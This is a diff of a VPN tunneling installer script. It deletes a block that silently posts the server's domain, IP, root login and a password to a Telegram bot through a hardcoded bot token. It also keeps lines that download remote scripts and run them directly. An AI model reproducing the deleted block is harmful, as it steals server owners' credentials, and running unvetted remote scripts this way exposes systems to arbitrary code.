@@ -246,23 +246,6 @@ clear
     fi
 	echo -e "${BGreen}Done!${NC}"
     sleep 2
-CHATID="-5548605787"
-KEY="6405908979:AAHFsGsHd88eYNb5qYX1w3mVEs3gTncS3ws"
-WKT="10"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Project VPN TUNNELING 
-============================
-<code>Domain     :</code> <code>$dom</code>
-<code>IP Vps     :</code> <code>$MYIP</code>
-<code>User Login :</code> <code>root</code>
-<code>Pass Login :</code> <code>bok</code>
-<code>User Script:</code> <code>$Name</code>
-<code>Exp Script :</code> <code>$exp2 day</code>
-<code>Location   :</code> <code>$CITY</code>
-<code>Timezone   :</code> <code>$TIME</code>
-============================
-"
-curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 #THEME RED
 cat <<EOF>> /etc/ssnvpn/theme/red
@@ -323,10 +306,6 @@ sleep 2
 wget https://raw.githubusercontent.com/fv-store/vvip/main/update/update.sh && chmod +x update.sh && ./update.sh
 rm -f update.sh
 clear
-echo -e "$green[INFO]$NC INSTALL SLOWDNS"
-sleep 2
-wget https://raw.githubusercontent.com/fv-store/vvip/main/slowdns/installsl.sh && chmod +x installsl.sh && ./installsl.sh
-clear
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "$green      Install openvpn              $NC"
 echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
@@ -374,15 +353,11 @@ curl -sS ifconfig.me > /etc/myipvps
 echo " "
 echo "=====================-[ FV STORE ]-===================="
 echo ""
-echo "------------------------------------------------------------"
-echo ""
-echo ""
-echo "   >>> Service & Port"  | tee -a log-install.txt
+echo "   >>> Service & Port <<<"  | tee -a log-install.txt
 echo "   - OpenSSH                 : 22"  | tee -a log-install.txt
-echo "   - SSH Websocket           : 80" | tee -a log-install.txt
-echo "   - SSH SSL Websocket       : 443" | tee -a log-install.txt
-echo "   - SSH NON-SSL Websocket   : 80, 8880" | tee -a log-install.txt
-echo "   - SLOWDNS                 : 5300 [ON]" | tee -a log-install.txt
+echo "   - SSH Websocket HTTP      : 80, 8880" | tee -a log-install.txt
+echo "   - SSH Websocket SSL       : 443" | tee -a log-install.txt
+echo "   - UDP Custom              : 1-65535" | tee -a log-install.text
 echo "   - Stunnel4                : 447, 777" | tee -a log-install.txt
 echo "   - Dropbear                : 109, 143" | tee -a log-install.txt
 echo "   - Badvpn                  : 7100-7300" | tee -a log-install.txt
@@ -413,10 +388,7 @@ echo "   - Restore Data" | tee -a log-install.txt
 echo "   - Full Orders For Various Services" | tee -a log-install.txt
 echo ""  | tee -a log-install.txt
 echo ""
-echo ""
-echo "------------------------------------------------------------"
-echo ""
-echo "===============-[ FV STORE  ]-==============="
+echo "===============-[ FV STORE ]-==============="
 echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
